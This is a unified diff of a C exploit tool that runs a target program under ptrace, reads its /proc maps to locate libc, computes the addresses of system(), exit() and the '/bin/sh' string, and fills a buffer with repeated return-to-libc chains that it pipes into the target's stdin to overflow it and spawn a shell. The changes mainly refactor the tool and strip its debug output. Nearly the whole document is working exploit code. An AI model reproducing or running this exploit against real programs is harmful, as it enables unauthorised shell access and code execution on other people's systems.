@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdint.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,14 +7,19 @@
 #include <sys/ptrace.h>
 #include <asm/unistd.h>
 #include <sys/reg.h>
+#include <sys/wait.h>
+
+#define MAX_BUFFLEN     (4096)
 
 static unsigned long exitvaddr		= 0x2de10;
 static unsigned long systemvaddr	= 0x380b0;
 static unsigned long binshvaddr		= 0x1243ff;
 
+/* in bss segment, so 0 initialized */
+static uint8_t injected_buffer[MAX_BUFFLEN];
+
 static void ril_unblock_child(pid_t child)
 {
-    puts("detaching child\n");
     ptrace(PTRACE_DETACH,   child,  NULL, NULL);
 }
 
@@ -30,9 +36,6 @@ static int ril_ptrace(pid_t child)
 			break;
 		orig_eax = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);
 		if (orig_eax == __NR_write) {
-            printf("first prompt detected, then,"
-                   "we're going to infect stdin child process\n");
-            ril_unblock_child(child);
             return 1;
 		}
 		ptrace(PTRACE_SYSCALL, child, NULL, NULL);
@@ -46,15 +49,12 @@ static FILE *ril_open_map_file(pid_t pid)
 	char buff[20];
 
 	snprintf(buff, sizeof(buff), "/proc/%u/maps", pid);
-	printf("opening %s file\n", buff);
 
 	ret = fopen(buff, "r");
 	if (ret == NULL) {
 		perror("fopen :");
-		return ret;
 	}
 	return ret;
-
 }
 
 static void ril_close_map_file(FILE * fp)
@@ -68,6 +68,8 @@ static int ril_matchline_map_file(char *const line)
 {
 	char useless[128], perm[5];
 	unsigned long start_vaddr;
+    int ret = 0;
+
 	if (strstr(line, "libc-") == NULL) {
 		return 0;
 	}
@@ -79,66 +81,79 @@ static int ril_matchline_map_file(char *const line)
 		exitvaddr += start_vaddr;
 		systemvaddr += start_vaddr;
 		binshvaddr += start_vaddr;
-		fprintf(stdout, "target_func_vaddr[system=%lx, exit=%lx, /bin/sh=%lx\n]",
-				systemvaddr,
-				exitvaddr,
-				binshvaddr);
-		return 1;
+		ret = 1;
 	}
-	return 0;
+	return ret;
 }
 
 static int ril_read_map_file(FILE * fp)
 {
 	char line[512];
+    int  ret = 0;
 	if (!fp) {
-		return;
+		return 0;
 	}
-	while (fgets(line, sizeof(line), fp)) {
+	while (fgets(line, sizeof(line), fp) && !ret) {
 		if (ril_matchline_map_file(line)) {
-			return 1;
+			ret = 1;
 		}
 	}
-	return 0;
+	return ret;
 }
 
-void ril_make_buffer(char **buffer, pid_t pid, size_t noplen)
+void ril_make_buffer(pid_t pid, size_t bufflen)
 {
-    size_t allocsize, i;
-    size_t nbiter;
-    size_t rest = noplen % 3;
-    unsigned long *ptr;
+    unsigned long *walker, *base;
+    uint8_t *maxbnd;
+    size_t ulonglen = sizeof(unsigned long);
+    size_t i;
 
-    allocsize = (rest + noplen) * sizeof(unsigned long) + 2;
-    nbiter = allocsize / 3;
-    *buffer = malloc(allocsize);
-    ptr = (*buffer) + allocsize;
-	while(ptr - 2 > *buffer){
-		*ptr = systemvaddr;
-		ptr--;
-		*ptr = binshvaddr;
-		ptr--;
-	}
-
-	/*
-    for( i = 0; i < allocsize; ++i) {
-        *ptr = systemvaddr; 
-        ptr++;
-        *ptr = exitvaddr;
-        ptr++;
-        *ptr = binshvaddr;
-        ptr++;
+    bufflen = (bufflen + (ulonglen - 1)) & ~(ulonglen - 1);
+    if(bufflen >= MAX_BUFFLEN) {
+            return;
     }
-	*/
+    base    = (unsigned long*)(injected_buffer);
+    walker  = (unsigned long*)(injected_buffer + bufflen);
+    while (walker - 3 >= base) {
+           --walker;
+           *walker =   systemvaddr;
+           --walker;
+           *walker =   exitvaddr;
+           --walker;
+           *walker =   binshvaddr;
+    }
+    /*complete our bottom part with a letter*/
+    memset(injected_buffer, 'a', sizeof(unsigned long) * (walker - base));
+}
+
+static void ril_prepare_child_pipe(int fdpipe[2])
+{
+	dup2(fdpipe[0], STDIN_FILENO);
+	close(fdpipe[1]);
+}
+
+static void ril_prepare_parent_pipe(int fdpipe[2])
+{
+	close(fdpipe[0]);
+	dup2(fdpipe[1], STDOUT_FILENO);
+}
+
+static void ril_stop_child_pipe(int fdpipe[2])
+{
+    close(fdpipe[0]);
+}
+
+static void ril_stop_parent_pipe(int fdpipe[2])
+{
+    close(fdpipe[1]);
 }
 
 int main(int argc, char *argv[])
 {
-	FILE *fp;
-	pid_t pid;
-	size_t bufflen;
-	int fdpipe[2];
-	char *buffer = NULL;
+	FILE    *fp;
+	pid_t   pid;
+	size_t  bufflen;
+	int     fdpipe[2];
 
 	if (argc != 3) {
 		fprintf(stderr, "usage : %s <appzname> <buffsize>\n", *argv);
@@ -154,28 +169,26 @@ int main(int argc, char *argv[])
 	}
 
 	if (pid == 0) {
-		dup2(fdpipe[0], STDIN_FILENO);
-		close(fdpipe[1]);
+        ril_prepare_child_pipe(fdpipe);
 		ptrace(PTRACE_TRACEME, 0, 0, 0);
 		execl(argv[1], argv[1], NULL);
+        ril_stop_child_pipe(fdpipe);
 		exit(0);
 	} else {
         int ret = ril_ptrace(pid);
         if(ret == 0) {
-            printf("target finished without giving us opportunity to infect stdin\n");
+            fprintf(stderr, "target finished without giving us"
+                            "opportunity to infect stdin\n");
             return 0;
         }
 		fp = ril_open_map_file(pid);
 		if (ril_read_map_file(fp)) {
-			ril_make_buffer(&buffer, pid, atoi(argv[2]));
+			ril_make_buffer(pid, atoi(argv[2]));
 		}
-		//ril_close_map_file(fp);
-        printf("continue execution of %s\n", argv[1]);
         ril_unblock_child(pid);
-        
-		close(fdpipe[0]);
-		dup2(fdpipe[1], STDOUT_FILENO);
-		puts(buffer);
+        ril_prepare_parent_pipe(fdpipe); 
+		puts(injected_buffer);
+        ril_stop_parent_pipe(fdpipe);
 	}
 
 	return 0;
